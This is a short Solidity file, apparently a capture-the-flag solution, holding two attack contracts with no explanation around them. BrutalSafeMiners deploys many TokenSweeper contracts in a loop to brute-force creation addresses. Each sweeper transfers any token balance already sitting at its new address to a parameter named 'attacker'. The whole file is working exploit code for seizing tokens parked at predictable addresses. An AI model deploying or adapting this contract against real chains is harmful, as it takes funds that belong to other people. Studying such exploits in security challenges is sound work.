pragma solidity 0.8.12;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract BrutalSafeMiners {
    constructor(address attacker, IERC20 token, uint256 nonces) {
        for (uint256 i = 0; i < nonces; i++) {
            new TokenSweeper(attacker, token);
        }
    }
}

contract TokenSweeper {
    constructor(address attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
